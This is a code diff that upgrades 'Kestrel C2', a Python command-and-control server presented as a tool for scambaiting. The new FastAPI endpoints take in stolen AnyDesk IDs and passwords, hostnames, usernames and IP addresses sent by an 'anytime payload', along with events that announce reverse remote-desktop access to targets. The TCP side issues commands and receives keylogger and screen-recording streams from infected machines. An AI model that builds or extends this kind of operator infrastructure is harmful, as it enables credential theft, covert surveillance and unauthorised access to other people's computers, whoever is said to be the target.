@@ -1,8 +1,8 @@
 #!/usr/bin/env python3
 """
-TCP Command Sender (Enhanced - Dual Purpose C2)
+TCP Command Sender (Enhanced - Triple Purpose C2)
 This program listens for incoming connections and sends commands to execute.
-Now also receives HTTP reports from anytime payload.
+Now also receives HTTP reports from anytime payload and AnyDesk events from blackhole.
 """
 
 import os
@@ -10,12 +10,19 @@ import socket
 import sys
 import json
 import threading
+import time
 from datetime import datetime
-from http.server import BaseHTTPRequestHandler, HTTPServer
+from typing import Optional, Dict, Any
 from tqdm import tqdm
 
+# FastAPI imports
+from fastapi import FastAPI, Request, HTTPException, Depends
+from fastapi.security import APIKeyHeader
+from pydantic import BaseModel
+import uvicorn
+
 # Import from utils modules
-from utils.config import DEFAULT_HOST, DEFAULT_PORT, BUFFER_SIZE, BINARY_START_MARKER
+from utils.config import DEFAULT_HOST, DEFAULT_PORT, BUFFER_SIZE, BINARY_START_MARKER, C2_API_KEY, FASTAPI_PORT
 from utils.protocol import receive_text, receive_binary, peek_for_binary
 
 
@@ -27,10 +34,262 @@ DATA_DIRS = [
     "data/snapshots",
     "data/screenrecordings",
     "data/anytime_reports",
+    "data/anydesk_events",
 ]
 
 for dir_path in DATA_DIRS:
     os.makedirs(dir_path, exist_ok=True)
+
+
+# ============================================================================
+# CONSTANTS
+# ============================================================================
+
+# Timing delays (seconds)
+FASTAPI_STARTUP_DELAY = 1  # Time to wait for FastAPI to initialize before starting TCP server
+
+
+# ============================================================================
+# FASTAPI APPLICATION
+# ============================================================================
+
+# Create FastAPI app
+app = FastAPI(
+    title="Kestrel C2 Server",
+    description="Command & Control server for scambaiting operations",
+    version="2.0.0",
+)
+
+# API Key security
+api_key_header = APIKeyHeader(name="X-API-Key", auto_error=True)
+
+
+def get_api_key(api_key: str = Depends(api_key_header)):
+    """Validate API key from request header"""
+    if api_key == C2_API_KEY:
+        return api_key
+    raise HTTPException(status_code=401, detail="Invalid API Key")
+
+
+# Pydantic models for request validation
+class AnyDeskEvent(BaseModel):
+    """Model for AnyDesk connection events from Blackhole"""
+
+    event_type: str
+    anydesk_id: str
+    ip_address: Optional[str] = None
+    timestamp: str
+    metadata: Dict[str, Any] = {}
+
+
+class AnytimeReport(BaseModel):
+    """Model for AnyDesk access reports from Anytime payload"""
+
+    id: str
+    password: str
+    hostname: Optional[str] = None
+    username: Optional[str] = None
+    execution_time: Optional[str] = None
+    os_version: Optional[str] = None
+    timezone: Optional[str] = None
+    timezone_offset: Optional[str] = None
+    locale: Optional[str] = None
+    local_ip: Optional[str] = None
+    external_ip: Optional[str] = None
+
+
+# ============================================================================
+# FASTAPI ROUTES
+# ============================================================================
+
+
+@app.post("/anydesk_event")
+async def anydesk_event(event: AnyDeskEvent, request: Request, api_key: str = Depends(get_api_key)):
+    """Receive AnyDesk connection events from Blackhole"""
+    log_anydesk_event(event.dict(), request.client.host)
+    return {"status": "ok"}
+
+
+@app.post("/report")
+async def anytime_report(report: AnytimeReport, request: Request, api_key: str = Depends(get_api_key)):
+    """Receive AnyDesk access reports from Anytime payload"""
+    log_anytime_report(report.dict(), request.client.host)
+    return {"status": "ok"}
+
+
+# ============================================================================
+# LOGGING FUNCTIONS
+# ============================================================================
+
+
+def log_anydesk_event(data: dict, remote_addr: str):
+    """Log AnyDesk connection event to files and display in console"""
+    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+
+    # Extract event data
+    event_type = data.get("event_type", "UNKNOWN")
+    anydesk_id = data.get("anydesk_id", "N/A")
+    ip_address = data.get("ip_address", "N/A")
+    event_timestamp = data.get("timestamp", timestamp)
+    metadata = data.get("metadata", {})
+
+    # Append to JSON Lines log (one event per line)
+    today = datetime.now().strftime("%Y%m%d")
+    jsonl_file = f"data/anydesk_events/events_{today}.jsonl"
+    with open(jsonl_file, "a") as f:
+        event_record = {
+            "logged_at": timestamp,
+            "event_timestamp": event_timestamp,
+            "event_type": event_type,
+            "anydesk_id": anydesk_id,
+            "ip_address": ip_address,
+            "metadata": metadata,
+            "source_ip": remote_addr,
+        }
+        f.write(json.dumps(event_record) + "\n")
+
+    # Append to master log (human-readable)
+    with open("data/anydesk_events/master_log.txt", "a") as f:
+        f.write(f"\n[{timestamp}] {event_type.upper()}\n")
+        f.write(f"  AnyDesk ID:  {anydesk_id}\n")
+        f.write(f"  IP Address:  {ip_address}\n")
+        f.write(f"  Timestamp:   {event_timestamp}\n")
+        if metadata:
+            f.write(f"  Metadata:    {json.dumps(metadata)}\n")
+        f.write(f"  Source:      {remote_addr}\n")
+        f.write(f"-" * 60 + "\n")
+
+    # Display in console based on event type
+    if event_type == "incoming_request":
+        print(f"\n{'='*70}")
+        print(f"🚨 INCOMING CONNECTION REQUEST")
+        print(f"{'='*70}")
+        print(f"  AnyDesk ID:  \033[1;33m{anydesk_id}\033[0m")
+        print(f"  IP Address:  \033[1;33m{ip_address}\033[0m")
+        print(f"  Timestamp:   {event_timestamp}")
+        if metadata.get("reverse_connection_initiated"):
+            print(f"  \033[1;32m✓ Reverse connection initiated\033[0m")
+        if metadata.get("firewall_auto_enabled"):
+            print(f"  \033[1;32m✓ Firewall auto-enabled\033[0m")
+        print(f"{'='*70}\n")
+
+    elif event_type == "outgoing_accepted":
+        print(f"\n{'='*70}")
+        print(f"🎯 SUCCESS! REVERSE CONNECTION ACCEPTED")
+        print(f"{'='*70}")
+        print(f"  Target:      \033[1;32m{anydesk_id}\033[0m")
+        print(f"  Timestamp:   {event_timestamp}")
+        print(f"  \033[1;32mYOU NOW HAVE ACCESS TO SCAMMER'S MACHINE!\033[0m")
+        print(f"{'='*70}\n")
+
+    elif event_type == "outgoing_rejected":
+        attempt = metadata.get("attempt_number", "N/A")
+        print(f"\n{'='*70}")
+        print(f"❌ REVERSE CONNECTION REJECTED")
+        print(f"{'='*70}")
+        print(f"  Target:      {anydesk_id}")
+        print(f"  Attempt:     {attempt}")
+        print(f"  Timestamp:   {event_timestamp}")
+        print(f"{'='*70}\n")
+
+    else:
+        # Generic event display
+        print(f"\n[ANYDESK EVENT] {event_type}: {anydesk_id} @ {ip_address}")
+
+
+def log_anytime_report(data: dict, remote_addr: str):
+    """Log AnyDesk access report to files and display in console"""
+    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+
+    # Extract all fields from report
+    anydesk_id = data.get("id", "UNKNOWN")
+    password = data.get("password", "UNKNOWN")
+    hostname = data.get("hostname", "UNKNOWN")
+    username = data.get("username", "UNKNOWN")
+    execution_time = data.get("execution_time", "N/A")
+    os_version = data.get("os_version", "N/A")
+    timezone = data.get("timezone", "N/A")
+    timezone_offset = data.get("timezone_offset", "N/A")
+    locale = data.get("locale", "N/A")
+    local_ip = data.get("local_ip", "N/A")
+    external_ip = data.get("external_ip", "N/A")
+
+    # Build complete report object
+    report = {
+        "timestamp": timestamp,
+        "anydesk_id": anydesk_id,
+        "password": password,
+        "hostname": hostname,
+        "username": username,
+        "os_version": os_version,
+        "timezone": timezone,
+        "timezone_offset": timezone_offset,
+        "locale": locale,
+        "local_ip": local_ip,
+        "external_ip": external_ip,
+        "execution_time": execution_time,
+        "source_ip": remote_addr,
+    }
+
+    # Save individual JSON report
+    report_filename = f"report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
+    report_file = f"data/anytime_reports/{report_filename}"
+    with open(report_file, "w") as f:
+        json.dump(report, f, indent=2)
+
+    # Append to master log
+    with open("data/anytime_reports/master_log.txt", "a") as f:
+        f.write(f"\n{'='*70}\n")
+        f.write(f"[{timestamp}] NEW ANYDESK ACCESS\n")
+        f.write(f"{'='*70}\n")
+        f.write(f"AnyDesk ID:  {anydesk_id}\n")
+        f.write(f"Password:    {password}\n")
+        f.write(f"\n")
+        f.write(f"SYSTEM:\n")
+        f.write(f"  Hostname:    {hostname}\n")
+        f.write(f"  Username:    {username}\n")
+        f.write(f"  OS:          {os_version}\n")
+        f.write(f"\n")
+        f.write(f"LOCATION:\n")
+        f.write(f"  Timezone:    {timezone} (UTC{timezone_offset})\n")
+        f.write(f"  Locale:      {locale}\n")
+        f.write(f"  Local IP:    {local_ip}\n")
+        f.write(f"  External IP: {external_ip}\n")
+        f.write(f"\n")
+        f.write(f"PERFORMANCE:\n")
+        f.write(f"  Exec Time:   {execution_time}s\n")
+        f.write(f"  Source IP:   {remote_addr}\n")
+        f.write(f"\n")
+
+    # Display prominently in console
+    print(f"\n{'='*70}")
+    print(f"🎯 NEW ANYDESK ACCESS REPORTED!")
+    print(f"{'='*70}")
+    print(f"  AnyDesk ID:  \033[1;32m{anydesk_id}\033[0m")
+    print(f"  Password:    \033[1;32m{password}\033[0m")
+    print(f"")
+    print(f"  SYSTEM:")
+    print(f"    Hostname:    {hostname}")
+    print(f"    Username:    {username}")
+    print(f"    OS:          {os_version}")
+    print(f"")
+    print(f"  LOCATION:")
+    print(f"    Timezone:    {timezone} (UTC{timezone_offset})")
+    print(f"    Locale:      {locale}")
+    print(f"    Local IP:    {local_ip}")
+    print(f"    External IP: {external_ip}")
+    print(f"")
+    print(f"  PERFORMANCE:")
+    print(f"    Exec Time:   {execution_time}s")
+    print(f"    Source IP:   {remote_addr}")
+    print(f"{'='*70}")
+    print(f"  Saved to: {report_file}")
+    print(f"{'='*70}\n")
+
+
+# ============================================================================
+# TCP COMMAND HANDLER
+# ============================================================================
 
 
 def handle_keylog_stream(client_socket):
@@ -39,8 +298,6 @@ def handle_keylog_stream(client_socket):
     Receives keystrokes in real-time and writes to file.
     Non-blocking: Press Enter to send /stop command.
     """
-    import threading
-
     # Receive start marker with timestamp
     data = receive_text(client_socket)
     if not data.startswith("<KEYLOG_START>"):
@@ -170,8 +427,6 @@ def handle_screenrecord_stream(client_socket):
     print()
 
     # Flag to signal stop
-    import threading
-
     stop_requested = threading.Event()
 
     def input_thread():
@@ -333,135 +588,9 @@ def handle_response(client_socket, command):
                 print()
 
 
-class AnytimeReportHandler(BaseHTTPRequestHandler):
-    """HTTP request handler for anytime payload reports"""
-
-    def log_message(self, format, *args):
-        """Suppress default HTTP server logging"""
-        pass
-
-    def do_POST(self):
-        """Handle POST requests to /report endpoint"""
-        if self.path == "/report":
-            try:
-                # Read and parse request body
-                content_length = int(self.headers.get("Content-Length", 0))
-                body = self.rfile.read(content_length)
-                data = json.loads(body.decode("utf-8"))
-
-                # Log the report
-                self.log_anydesk_report(data)
-
-                # Send success response
-                self.send_response(200)
-                self.send_header("Content-Type", "text/plain")
-                self.end_headers()
-                self.wfile.write(b"OK")
-
-            except Exception as e:
-                print(f"\n[HTTP ERROR] Failed to process report: {e}")
-                self.send_response(500)
-                self.end_headers()
-        else:
-            # 404 for any other path
-            self.send_response(404)
-            self.end_headers()
-
-    def log_anydesk_report(self, data):
-        """Log AnyDesk access report to files and display in console"""
-        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-
-        # Extract all fields from report
-        anydesk_id = data.get("id", "UNKNOWN")
-        password = data.get("password", "UNKNOWN")
-        hostname = data.get("hostname", "UNKNOWN")
-        username = data.get("username", "UNKNOWN")
-        execution_time = data.get("execution_time", "N/A")
-        os_version = data.get("os_version", "N/A")
-        timezone = data.get("timezone", "N/A")
-        timezone_offset = data.get("timezone_offset", "N/A")
-        locale = data.get("locale", "N/A")
-        local_ip = data.get("local_ip", "N/A")
-        external_ip = data.get("external_ip", "N/A")
-
-        # Build complete report object
-        report = {
-            "timestamp": timestamp,
-            "anydesk_id": anydesk_id,
-            "password": password,
-            "hostname": hostname,
-            "username": username,
-            "os_version": os_version,
-            "timezone": timezone,
-            "timezone_offset": timezone_offset,
-            "locale": locale,
-            "local_ip": local_ip,
-            "external_ip": external_ip,
-            "execution_time": execution_time,
-            "source_ip": self.client_address[0],
-        }
-
-        # Save individual JSON report
-        report_filename = f"report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
-        report_file = f"data/anytime_reports/{report_filename}"
-        with open(report_file, "w") as f:
-            json.dump(report, f, indent=2)
-
-        # Append to master log
-        with open("data/anytime_reports/master_log.txt", "a") as f:
-            f.write(f"\n{'='*70}\n")
-            f.write(f"[{timestamp}] NEW ANYDESK ACCESS\n")
-            f.write(f"{'='*70}\n")
-            f.write(f"AnyDesk ID:  {anydesk_id}/np\n")
-            f.write(f"Password:    {password}\n")
-            f.write(f"\n")
-            f.write(f"SYSTEM:\n")
-            f.write(f"  Hostname:    {hostname}\n")
-            f.write(f"  Username:    {username}\n")
-            f.write(f"  OS:          {os_version}\n")
-            f.write(f"\n")
-            f.write(f"LOCATION:\n")
-            f.write(f"  Timezone:    {timezone} (UTC{timezone_offset:+})\n")
-            f.write(f"  Locale:      {locale}\n")
-            f.write(f"  Local IP:    {local_ip}\n")
-            f.write(f"  External IP: {external_ip}\n")
-            f.write(f"\n")
-            f.write(f"PERFORMANCE:\n")
-            f.write(f"  Exec Time:   {execution_time}s\n")
-            f.write(f"  Source IP:   {self.client_address[0]}\n")
-            f.write(f"\n")
-
-        # Display prominently in console
-        print(f"\n{'='*70}")
-        print(f"🎯 NEW ANYDESK ACCESS REPORTED!")
-        print(f"{'='*70}")
-        print(f"  AnyDesk ID:  \033[1;32m{anydesk_id}/np\033[0m")
-        print(f"  Password:    \033[1;32m{password}\033[0m")
-        print(f"")
-        print(f"  SYSTEM:")
-        print(f"    Hostname:    {hostname}")
-        print(f"    Username:    {username}")
-        print(f"    OS:          {os_version}")
-        print(f"")
-        print(f"  LOCATION:")
-        print(f"    Timezone:    {timezone} (UTC{timezone_offset:+})")
-        print(f"    Locale:      {locale}")
-        print(f"    Local IP:    {local_ip}")
-        print(f"    External IP: {external_ip}")
-        print(f"")
-        print(f"  PERFORMANCE:")
-        print(f"    Exec Time:   {execution_time}s")
-        print(f"    Source IP:   {self.client_address[0]}")
-        print(f"{'='*70}")
-        print(f"  Saved to: {report_file}")
-        print(f"{'='*70}\n")
-
-
-def start_http_server(host, port):
-    """Start HTTP server for anytime payload reports"""
-    server = HTTPServer((host, port), AnytimeReportHandler)
-    print(f"HTTP server listening on {host}:{port}")
-    server.serve_forever()
+def start_fastapi_server():
+    """Start FastAPI server with uvicorn"""
+    uvicorn.run(app, host="0.0.0.0", port=FASTAPI_PORT, log_level="error", access_log=False)
 
 
 def start_tcp_sender(host: str = DEFAULT_HOST, port: int = DEFAULT_PORT) -> None:
@@ -482,7 +611,7 @@ def start_tcp_sender(host: str = DEFAULT_HOST, port: int = DEFAULT_PORT) -> None
         # Bind the socket to the host and port
         server_socket.bind((host, port))
 
-        # Listen for incoming connections (max 1 queued connection)
+        # Listen for incoming connections (backlog of 1)
         server_socket.listen(1)
 
         print(f"Listening on {host}:{port}")
@@ -519,9 +648,6 @@ def start_tcp_sender(host: str = DEFAULT_HOST, port: int = DEFAULT_PORT) -> None
                     except BrokenPipeError:
                         print("\nConnection closed by receiver")
                         break
-                    except ConnectionResetError:
-                        print("\nConnection lost")
-                        break
                     except Exception as e:
                         print(f"\nError: {e}")
                         break
@@ -544,15 +670,25 @@ def start_tcp_sender(host: str = DEFAULT_HOST, port: int = DEFAULT_PORT) -> None
 
 
 if __name__ == "__main__":
-    print("\n[ Enhanced C2 Server - Dual Purpose ]\n")
+    print("\n[ Enhanced C2 Server - Triple Purpose ]\n")
     print("Modes:")
-    print("  1. TCP Server  (port 5555) - receiver.py connections")
-    print("  2. HTTP Server (port 8080) - anytime payload reports")
+    print("  1. TCP Server   (port 5555) - receiver.py connections")
+    print("  2. FastAPI HTTP (port 8080) - anytime reports + AnyDesk events")
+    print()
+    print("FastAPI Features:")
+    print("  • POST /report - Anytime payload reports")
+    print("  • POST /anydesk_event - Blackhole AnyDesk events")
+    print("  • API Key authentication (X-API-Key header)")
+    print(f"  • Interactive docs: http://localhost:{FASTAPI_PORT}/docs")
     print()
 
-    # Start HTTP server in background thread
-    http_thread = threading.Thread(target=start_http_server, args=("0.0.0.0", 8080), daemon=True)
-    http_thread.start()
+    # Start FastAPI server in background thread
+    fastapi_thread = threading.Thread(target=start_fastapi_server, daemon=True, name="FastAPI")
+    fastapi_thread.start()
+    print(f"[FastAPI] Starting on port {FASTAPI_PORT}...")
+
+    # Give FastAPI time to start
+    time.sleep(FASTAPI_STARTUP_DELAY)
 
     # Start TCP server in main thread
     print("[ TCP Server Starting... ]\n")
